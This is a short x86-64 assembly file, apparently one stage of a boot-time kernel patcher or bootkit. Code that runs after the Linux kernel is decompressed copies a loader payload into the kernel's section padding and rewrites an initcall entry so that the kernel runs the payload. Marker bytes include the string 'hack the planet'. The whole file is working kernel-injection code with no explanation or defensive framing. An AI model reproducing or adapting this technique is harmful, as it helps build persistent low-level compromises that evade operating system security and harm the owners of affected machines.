BITS 64

; marker to find the bios entry
    dd 0x41424344
    db "hack the planet", 0
    dd 0x61626364

; this is the code we call just after the kernel is decompressed if we boot via
; BIOS.
_bios_entry:
    push rax
    push rcx
    push rdi
    push rsi

; now we need patch the kernel and get stage1 in a suitable place.
 
; so the kernel pads sections with 0xcc, with a 0x20_00_00 alignment, so we
; have a ton of free space to place a payload.
; %define _stage1_offset 0x01_30_00_00
    lea rsi, [rel _initcall_runtime_thunk]
    lea rdi, [rax + _stage1_offset]
    mov rcx, _kshelf_loader_len + (_kshelf_loader - _initcall_runtime_thunk)
    rep movsb


; hook initcall to call our stage1
; %define _initcall_offset 0x02_b6_ee_08
    ; (rax + _initcall_offset + value)
    ; 0xffdd6d48
    mov edi, _stage1_offset - _initcall_offset
    mov dword [rax + _initcall_offset], edi

; now we can transfer control over
    pop rsi
    pop rdi
    pop rcx
    pop rax
    jmp rax
